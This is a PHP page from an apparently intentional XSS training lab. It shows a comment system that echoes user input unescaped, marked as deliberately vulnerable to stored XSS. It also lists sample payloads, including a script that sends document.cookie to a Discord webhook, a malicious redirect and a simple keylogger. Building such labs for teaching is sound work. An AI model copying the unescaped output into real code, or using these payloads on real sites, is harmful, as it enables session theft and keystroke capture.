<?php
session_start();
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    header('Location: login.php');
    exit;
}

// Simular "banco de dados" de comentários
if (!isset($_SESSION['comments'])) {
    $_SESSION['comments'] = [
        ['user' => 'Admin', 'comment' => 'Bem-vindos ao laboratório XSS!', 'time' => '2024-01-01 10:00']
    ];
}

// Processar novo comentário
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comment'])) {
    $new_comment = [
        'user' => $_SESSION['user'],
        'comment' => $_POST['comment'], // VULNERÁVEL - sem sanitização
        'time' => date('Y-m-d H:i:s')
    ];
    
    array_unshift($_SESSION['comments'], $new_comment);
}

$comments = $_SESSION['comments'];
?>

<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Comentários - PolyTools XSS</title>
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">
                <h1>🔧 PolyTools</h1>
                <p>Sistema de Comentários - Laboratório XSS</p>
            </div>
            <nav>
                <a href="dashboard.php" class="btn-back">Voltar</a>
            </nav>
        </header>

        <main>
            <div class="comments-section">
                <h2>💬 Sistema de Comentários</h2>
                <p class="warning">⚠️ VULNERÁVEL a XSS Armazenado</p>
                
                <form method="POST" class="comment-form">
                    <div class="form-group">
                        <label for="comment">Seu Comentário:</label>
                        <textarea id="comment" name="comment" rows="4" 
                                  placeholder="Digite seu comentário..."></textarea>
                    </div>
                    <button type="submit" class="btn-submit">Postar Comentário</button>
                </form>

                <div class="comments-list">
                    <h3>Comentários Recentes:</h3>
                    
                    <?php if (empty($comments)): ?>
                        <p>Nenhum comentário ainda.</p>
                    <?php else: ?>
                        <?php foreach ($comments as $comment): ?>
                            <div class="comment-item">
                                <div class="comment-header">
                                    <strong><?php echo htmlspecialchars($comment['user']); ?></strong>
                                    <span class="comment-time"><?php echo $comment['time']; ?></span>
                                </div>
                                <div class="comment-content">
                                    <?php echo $comment['comment']; // VULNERÁVEL - XSS Armazenado ?>
                                </div>
                            </div>
                        <?php endforeach; ?>
                    <?php endif; ?>
                </div>

                <div class="xss-payloads">
                    <h4>🔓 Payloads XSS para Testar:</h4>
                    <div class="payload-grid">
                        <div class="payload-card">
                            <h5>Alert Básico</h5>
                            <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
                        </div>
                        <div class="payload-card">
                            <h5>Robô de Discord</h5>
                            <code>&lt;script&gt;fetch('https://discord.com/api/webhooks/...',{method:'POST',body:JSON.stringify({content:document.cookie})})&lt;/script&gt;</code>
                        </div>
                        <div class="payload-card">
                            <h5>Redirecionamento</h5>
                            <code>&lt;script&gt;window.location='https://site-malicioso.com'&lt;/script&gt;</code>
                        </div>
                        <div class="payload-card">
                            <h5>Keylogger Simples</h5>
                            <code>&lt;script&gt;document.addEventListener('keydown',e=&gt;{fetch('/log?key='+e.key)})&lt;/script&gt;</code>
                        </div>
                    </div>
                </div>
            </div>
        </main>
    </div>
</body>
</html>
